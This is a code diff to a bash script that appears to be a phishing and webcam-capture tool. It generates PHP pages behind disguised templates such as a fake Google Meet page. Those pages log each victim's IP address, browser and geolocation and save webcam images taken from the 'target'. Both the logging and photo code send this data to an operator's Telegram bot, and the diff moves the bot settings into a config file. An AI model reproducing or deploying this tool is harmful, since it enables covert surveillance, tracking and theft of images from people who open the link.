@@ -291,13 +291,14 @@ fi
 
 # Generate ip.php with Telegram configuration if enabled
 if [[ "$telegram_enabled" == "1" ]]; then
-    # Escape single quotes for PHP string
-    telegram_token_php=$(printf '%s' "$telegram_token" | sed "s/'/\\\\'/g")
-    telegram_chat_php=$(printf '%s' "$telegram_chat" | sed "s/'/\\\\'/g")
-    
-    # Create ip.php with Telegram support (use quoted heredoc to prevent bash expansion)
+    # Create ip.php with Telegram support (reads from config file)
     cat > ip.php << 'IPEOF'
 <?php
+
+// Include geolocation helper
+if (file_exists('geo.php')) {
+    require_once 'geo.php';
+}
 
 if (!empty($_SERVER['HTTP_CLIENT_IP']))
     {
@@ -314,6 +315,16 @@ else
 $useragent = " User-Agent: ";
 $browser = $_SERVER['HTTP_USER_AGENT'];
 
+// Get IP geolocation if geo.php is available
+$ip_clean = trim($ipaddress);
+$geo = null;
+if (function_exists('getIPLocation')) {
+    $geo = getIPLocation($ip_clean);
+    if ($geo && function_exists('saveGeoData')) {
+        saveGeoData($ip_clean, $geo);
+    }
+}
+
 $file = 'ip.txt';
 $victim = "IP: ";
 $fp = fopen($file, 'a');
@@ -323,74 +334,74 @@ fwrite($fp, $ipaddress);
 fwrite($fp, $useragent);
 fwrite($fp, $browser);
 
+// Add geolocation info to file if available
+if ($geo && function_exists('formatGeoLocation') && isset($geo['status']) && $geo['status'] === 'success') {
+    fwrite($fp, "\n" . formatGeoLocation($geo) . "\n");
+}
+
 fclose($fp);
 
-// Send to Telegram
-$telegram_token = 'TELEGRAM_TOKEN_PLACEHOLDER';
-$telegram_chat = 'TELEGRAM_CHAT_PLACEHOLDER';
+// Send to Telegram - load from config file
+$telegram_token = '';
+$telegram_chat = '';
+$config_file = 'telegram_config.json';
 
-// Escape special characters in message
-$ip_clean = trim($ipaddress);
-$browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
-$message = "🔔 *New Target Opened Link*\n\n";
-$message .= "📍 *IP Address:* " . $ip_clean . "\n";
-$message .= "🌐 *User Agent:* " . $browser_clean . "\n";
-$message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";
+if (file_exists($config_file)) {
+    $config_content = file_get_contents($config_file);
+    $config = json_decode($config_content, true);
+    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
+        $telegram_token = $config['bot_token'];
+        $telegram_chat = $config['chat_id'];
+    }
+}
 
-$url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
-$data = array(
-    'chat_id' => $telegram_chat,
-    'text' => $message,
-    'parse_mode' => 'Markdown'
-);
+// Only send if Telegram is configured
+if (!empty($telegram_token) && !empty($telegram_chat)) {
+    // Escape special characters in message
+    $browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
+    $message = "🔔 *New Target Opened Link*\n\n";
+    $message .= "📍 *IP Address:* " . $ip_clean . "\n";
+    $message .= "🌐 *User Agent:* " . $browser_clean . "\n";
+    $message .= "⏰ *Time:* " . date('Y-m-d H:i:s') . "\n";
 
-$options = array(
-    'http' => array(
-        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
-        'method' => 'POST',
-        'content' => http_build_query($data),
-        'timeout' => 10,
-        'ignore_errors' => true
-    )
-);
+    // Add geolocation to Telegram message if available
+    if ($geo && function_exists('formatGeoForTelegram') && isset($geo['status']) && $geo['status'] === 'success') {
+        $message .= "\n" . formatGeoForTelegram($geo);
+    }
 
-$context = stream_context_create($options);
-$result = @file_get_contents($url, false, $context);
+    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendMessage";
+    $data = array(
+        'chat_id' => $telegram_chat,
+        'text' => $message,
+        'parse_mode' => 'Markdown'
+    );
 
-// Log errors if any
-if ($result === false) {
-    $error = error_get_last();
-    if ($error !== null) {
-        error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+    $options = array(
+        'http' => array(
+            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
+            'method' => 'POST',
+            'content' => http_build_query($data),
+            'timeout' => 10,
+            'ignore_errors' => true
+        )
+    );
+
+    $context = stream_context_create($options);
+    $result = @file_get_contents($url, false, $context);
+
+    // Log errors if any
+    if ($result === false) {
+        $error = error_get_last();
+        if ($error !== null) {
+            error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+        }
     }
 }
 IPEOF
-    
-    # Replace placeholders with actual values using perl or sed
-    if command -v perl > /dev/null 2>&1; then
-        perl -i -pe "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" ip.php
-        perl -i -pe "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" ip.php
-    elif command -v python > /dev/null 2>&1; then
-        python -c "import sys; data=open('ip.php','r',encoding='utf-8').read(); data=data.replace('TELEGRAM_TOKEN_PLACEHOLDER','$telegram_token_php'); data=data.replace('TELEGRAM_CHAT_PLACEHOLDER','$telegram_chat_php'); open('ip.php','w',encoding='utf-8').write(data)"
-    else
-        # Use sed (Windows Git Bash compatible)
-        if [[ -n "$WINDIR" ]] || [[ "$OSTYPE" == "msys" ]]; then
-            sed -i "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" ip.php
-            sed -i "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" ip.php
-        else
-            sed -i.bak "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" ip.php
-            sed -i.bak "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" ip.php
-            rm -f ip.php.bak 2>/dev/null || true
-        fi
-    fi
 fi
 
 # Generate post.php with Telegram configuration if enabled
 if [[ "$telegram_enabled" == "1" ]]; then
-    # Escape single quotes for PHP string (reuse variables from ip.php generation)
-    telegram_token_php=$(printf '%s' "$telegram_token" | sed "s/'/\\\\'/g")
-    telegram_chat_php=$(printf '%s' "$telegram_chat" | sed "s/'/\\\\'/g")
-    
     cat > post.php << 'POSTEOF'
 <?php
 
@@ -416,74 +427,87 @@ $fp = fopen($filePath, 'wb');
 fwrite($fp, $unencodedData);
 fclose($fp);
 
-// Send to Telegram
-$telegram_token = 'TELEGRAM_TOKEN_PLACEHOLDER';
-$telegram_chat = 'TELEGRAM_CHAT_PLACEHOLDER';
+// Send to Telegram - load from config file
+$telegram_token = '';
+$telegram_chat = '';
+$config_file = 'telegram_config.json';
 
-// Send photo to Telegram using cURL if available, otherwise use file_get_contents
-$url = "https://api.telegram.org/bot" . $telegram_token . "/sendPhoto";
-$caption = "📸 *Camera Capture*\n\n⏰ *Time:* " . date('Y-m-d H:i:s');
-
-if (function_exists('curl_file_create')) {
-    // Use cURL (preferred method)
-    $cfile = curl_file_create($filePath, 'image/png', 'cam' . $date . '.png');
-    $data = array(
-        'chat_id' => $telegram_chat,
-        'photo' => $cfile,
-        'caption' => $caption,
-        'parse_mode' => 'Markdown'
-    );
-    
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
-    $result = curl_exec($ch);
-    $error = curl_error($ch);
-    curl_close($ch);
-    
-    if ($error) {
-        error_log("Telegram cURL error: " . $error, 3, "telegram_error.log");
+if (file_exists($config_file)) {
+    $config_content = file_get_contents($config_file);
+    $config = json_decode($config_content, true);
+    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
+        $telegram_token = $config['bot_token'];
+        $telegram_chat = $config['chat_id'];
     }
-} else {
-    // Fallback to file_get_contents with multipart
-    $boundary = uniqid();
-    $delimiter = '-------------' . $boundary;
-    
-    $postData = '';
-    $postData .= "--" . $delimiter . "\r\n";
-    $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
-    $postData .= $telegram_chat . "\r\n";
-    
-    $postData .= "--" . $delimiter . "\r\n";
-    $postData .= 'Content-Disposition: form-data; name="photo"; filename="cam' . $date . '.png"' . "\r\n";
-    $postData .= 'Content-Type: image/png' . "\r\n\r\n";
-    $postData .= $unencodedData . "\r\n";
-    
-    $postData .= "--" . $delimiter . "\r\n";
-    $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
-    $postData .= $caption . "\r\n";
-    $postData .= "--" . $delimiter . "--\r\n";
-    
-    $options = array(
-        'http' => array(
-            'method' => 'POST',
-            'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
-            'content' => $postData,
-            'timeout' => 10,
-            'ignore_errors' => true
-        )
-    );
-    
-    $context = stream_context_create($options);
-    $result = @file_get_contents($url, false, $context);
-    
-    if ($result === false) {
-        $error = error_get_last();
-        if ($error !== null) {
-            error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+}
+
+// Only send if Telegram is configured
+if (!empty($telegram_token) && !empty($telegram_chat)) {
+    // Send photo to Telegram using cURL if available, otherwise use file_get_contents
+    $url = "https://api.telegram.org/bot" . $telegram_token . "/sendPhoto";
+    $caption = "📸 *Camera Capture*\n\n⏰ *Time:* " . date('Y-m-d H:i:s');
+
+    if (function_exists('curl_file_create')) {
+        // Use cURL (preferred method)
+        $cfile = curl_file_create($filePath, 'image/png', 'cam' . $date . '.png');
+        $data = array(
+            'chat_id' => $telegram_chat,
+            'photo' => $cfile,
+            'caption' => $caption,
+            'parse_mode' => 'Markdown'
+        );
+        
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $result = curl_exec($ch);
+        $error = curl_error($ch);
+        curl_close($ch);
+        
+        if ($error) {
+            error_log("Telegram cURL error: " . $error, 3, "telegram_error.log");
+        }
+    } else {
+        // Fallback to file_get_contents with multipart
+        $boundary = uniqid();
+        $delimiter = '-------------' . $boundary;
+        
+        $postData = '';
+        $postData .= "--" . $delimiter . "\r\n";
+        $postData .= 'Content-Disposition: form-data; name="chat_id"' . "\r\n\r\n";
+        $postData .= $telegram_chat . "\r\n";
+        
+        $postData .= "--" . $delimiter . "\r\n";
+        $postData .= 'Content-Disposition: form-data; name="photo"; filename="cam' . $date . '.png"' . "\r\n";
+        $postData .= 'Content-Type: image/png' . "\r\n\r\n";
+        $postData .= $unencodedData . "\r\n";
+        
+        $postData .= "--" . $delimiter . "\r\n";
+        $postData .= 'Content-Disposition: form-data; name="caption"' . "\r\n\r\n";
+        $postData .= $caption . "\r\n";
+        $postData .= "--" . $delimiter . "--\r\n";
+        
+        $options = array(
+            'http' => array(
+                'method' => 'POST',
+                'header' => 'Content-Type: multipart/form-data; boundary=' . $delimiter,
+                'content' => $postData,
+                'timeout' => 10,
+                'ignore_errors' => true
+            )
+        );
+        
+        $context = stream_context_create($options);
+        $result = @file_get_contents($url, false, $context);
+        
+        if ($result === false) {
+            $error = error_get_last();
+            if ($error !== null) {
+                error_log("Telegram send error: " . $error['message'], 3, "telegram_error.log");
+            }
         }
     }
 }
@@ -491,24 +515,6 @@ if (function_exists('curl_file_create')) {
 exit();
 ?>
 POSTEOF
-    
-    # Replace placeholders with actual values using perl or sed
-    if command -v perl > /dev/null 2>&1; then
-        perl -i -pe "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" post.php
-        perl -i -pe "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" post.php
-    elif command -v python > /dev/null 2>&1; then
-        python -c "import sys; data=open('post.php','r',encoding='utf-8').read(); data=data.replace('TELEGRAM_TOKEN_PLACEHOLDER','$telegram_token_php'); data=data.replace('TELEGRAM_CHAT_PLACEHOLDER','$telegram_chat_php'); open('post.php','w',encoding='utf-8').write(data)"
-    else
-        # Use sed (Windows Git Bash compatible)
-        if [[ -n "$WINDIR" ]] || [[ "$OSTYPE" == "msys" ]]; then
-            sed -i "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" post.php
-            sed -i "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" post.php
-        else
-            sed -i.bak "s|TELEGRAM_TOKEN_PLACEHOLDER|$telegram_token_php|g" post.php
-            sed -i.bak "s|TELEGRAM_CHAT_PLACEHOLDER|$telegram_chat_php|g" post.php
-            rm -f post.php.bak 2>/dev/null || true
-        fi
-    fi
 fi
 
 if [[ $option_tem -eq 1 ]]; then
@@ -519,6 +525,100 @@ elif [[ $option_tem -eq 2 ]]; then
 sed 's+forwarding_link+'$link'+g' Gmeet.html > index2.html
 elif [[ $option_tem -eq 3 ]]; then
 sed 's+forwarding_link+'$link'+g' Sensitive.html > index2.html
+fi
+}
+
+read_telegram_config() {
+local config_file="telegram_config.json"
+telegram_token=""
+telegram_chat=""
+
+if [[ ! -f "$config_file" ]]; then
+    return 1
+fi
+
+# Use PHP to parse JSON (most reliable since PHP is a dependency)
+if command -v php > /dev/null 2>&1; then
+    telegram_token=$(php -r "\$config = json_decode(file_get_contents('$config_file'), true); echo isset(\$config['bot_token']) ? \$config['bot_token'] : '';" 2>/dev/null | tr -d '\r\n')
+    telegram_chat=$(php -r "\$config = json_decode(file_get_contents('$config_file'), true); echo isset(\$config['chat_id']) ? \$config['chat_id'] : '';" 2>/dev/null | tr -d '\r\n')
+# Try Python as fallback
+elif command -v python3 > /dev/null 2>&1; then
+    telegram_token=$(python3 -c "import json; f=open('$config_file', 'r', encoding='utf-8'); d=json.load(f); f.close(); print(d.get('bot_token', '') or '')" 2>/dev/null | tr -d '\r\n')
+    telegram_chat=$(python3 -c "import json; f=open('$config_file', 'r', encoding='utf-8'); d=json.load(f); f.close(); print(d.get('chat_id', '') or '')" 2>/dev/null | tr -d '\r\n')
+elif command -v python > /dev/null 2>&1; then
+    telegram_token=$(python -c "import json; f=open('$config_file', 'r'); d=json.load(f); f.close(); print(d.get('bot_token', '') or '')" 2>/dev/null | tr -d '\r\n')
+    telegram_chat=$(python -c "import json; f=open('$config_file', 'r'); d=json.load(f); f.close(); print(d.get('chat_id', '') or '')" 2>/dev/null | tr -d '\r\n')
+elif command -v jq > /dev/null 2>&1; then
+    telegram_token=$(jq -r '.bot_token // empty' "$config_file" 2>/dev/null | tr -d '\r\n')
+    telegram_chat=$(jq -r '.chat_id // empty' "$config_file" 2>/dev/null | tr -d '\r\n')
+fi
+
+# If still empty, use simple text parsing (works everywhere including Windows Git Bash)
+if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat" ]]; then
+    # Read entire file content
+    local file_content=$(cat "$config_file" 2>/dev/null | tr -d '\r')
+    
+    # Extract bot_token - look for pattern: "bot_token": "value"
+    if echo "$file_content" | grep -q '"bot_token"'; then
+        # Try multiple extraction methods
+        telegram_token=$(echo "$file_content" | grep -o '"bot_token"[^}]*' | grep -o '"[^"]*"' | head -2 | tail -1 | tr -d '"')
+        # If that didn't work, try sed
+        if [[ -z "$telegram_token" ]]; then
+            telegram_token=$(echo "$file_content" | sed -n 's/.*"bot_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
+        fi
+    fi
+    
+    # Extract chat_id - look for pattern: "chat_id": "value"
+    if echo "$file_content" | grep -q '"chat_id"'; then
+        # Try multiple extraction methods
+        telegram_chat=$(echo "$file_content" | grep -o '"chat_id"[^}]*' | grep -o '"[^"]*"' | head -2 | tail -1 | tr -d '"')
+        # If that didn't work, try sed
+        if [[ -z "$telegram_chat" ]]; then
+            telegram_chat=$(echo "$file_content" | sed -n 's/.*"chat_id"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
+        fi
+    fi
+fi
+
+# Trim whitespace (handle both spaces and tabs)
+telegram_token=$(echo "$telegram_token" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+telegram_chat=$(echo "$telegram_chat" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+
+# Check if values are valid (not empty and not just whitespace)
+if [[ -n "$telegram_token" && "$telegram_token" != "null" && -n "$telegram_chat" && "$telegram_chat" != "null" ]]; then
+    return 0
+fi
+
+return 1
+}
+
+save_telegram_config() {
+local config_file="telegram_config.json"
+local token="$1"
+local chat="$2"
+
+# Try to save using available tools
+if command -v python3 > /dev/null 2>&1; then
+    python3 -c "import json; f=open('$config_file', 'w'); json.dump({'bot_token': '$token', 'chat_id': '$chat'}, f, indent=2); f.close()" 2>/dev/null
+elif command -v python > /dev/null 2>&1; then
+    python -c "import json; f=open('$config_file', 'w'); json.dump({'bot_token': '$token', 'chat_id': '$chat'}, f, indent=2); f.close()" 2>/dev/null
+elif command -v jq > /dev/null 2>&1; then
+    echo "{\"bot_token\": \"$token\", \"chat_id\": \"$chat\"}" | jq '.' > "$config_file" 2>/dev/null
+else
+    # Fallback: simple JSON writing
+    cat > "$config_file" << EOF
+{
+  "bot_token": "$token",
+  "chat_id": "$chat"
+}
+EOF
+fi
+
+if [[ -f "$config_file" ]]; then
+    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram configuration saved to %s\e[0m\n" "$config_file"
+    return 0
+else
+    printf "\e[1;93m[!] Warning: Could not save configuration file\e[0m\n"
+    return 1
 fi
 }
 
@@ -583,19 +683,36 @@ telegram_enabled="0"
 elif [[ $option_notification -eq 2 ]]; then
 printf "\e[1;93m[\e[0m*\e[1;93m] Selected: Telegram Bot\e[0m\n"
 telegram_enabled="1"
-printf "\e[1;93m[\e[0m*\e[1;93m] Note: Get your bot token from @BotFather on Telegram\e[0m\n"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Bot Token: \e[0m' telegram_token
-printf "\e[1;93m[\e[0m*\e[1;93m] Note: Enter YOUR username (where bot will send data), NOT the bot username\e[0m\n"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YOUR Telegram Username (e.g., yourusername) or Chat ID: \e[0m' telegram_chat_input
-if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat_input" ]]; then
-printf "\e[1;93m [!] Telegram token and username/chat_id are required!\e[0m\n"
-sleep 1
-select_notification
+
+# Try to load from config file first
+if read_telegram_config; then
+    printf "\e[1;92m[\e[0m+\e[1;92m] Loaded Telegram configuration from telegram_config.json\e[0m\n"
+    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Bot Token: %s...\e[0m\n" "${telegram_token:0:20}"
+    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Chat ID: %s\e[0m\n" "$telegram_chat"
+    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
+    test_telegram_bot
 else
-telegram_chat=$(normalize_telegram_chat "$telegram_chat_input")
-printf "\e[1;92m[\e[0m*\e[1;92m] Using chat identifier: %s\e[0m\n" "$telegram_chat"
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
-test_telegram_bot
+    # Config file doesn't exist or is invalid, prompt for details
+    printf "\e[1;93m[\e[0m*\e[1;93m] No valid Telegram configuration found in telegram_config.json\e[0m\n"
+    printf "\e[1;93m[\e[0m*\e[1;93m] Note: Get your bot token from @BotFather on Telegram\e[0m\n"
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Bot Token: \e[0m' telegram_token
+    printf "\e[1;93m[\e[0m*\e[1;93m] Note: Enter YOUR username (where bot will send data), NOT the bot username\e[0m\n"
+    read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter YOUR Telegram Username (e.g., yourusername) or Chat ID: \e[0m' telegram_chat_input
+    if [[ -z "$telegram_token" ]] || [[ -z "$telegram_chat_input" ]]; then
+        printf "\e[1;93m [!] Telegram token and username/chat_id are required!\e[0m\n"
+        sleep 1
+        select_notification
+    else
+        telegram_chat=$(normalize_telegram_chat "$telegram_chat_input")
+        printf "\e[1;92m[\e[0m*\e[1;92m] Using chat identifier: %s\e[0m\n" "$telegram_chat"
+        printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Testing Telegram bot connection...\e[0m\n"
+        test_telegram_bot
+        
+        # Save configuration after successful test
+        if [[ $? -eq 0 ]]; then
+            save_telegram_config "$telegram_token" "$telegram_chat"
+        fi
+    fi
 fi
 else
 printf "\e[1;93m [!] Invalid notification option! try again\e[0m\n"
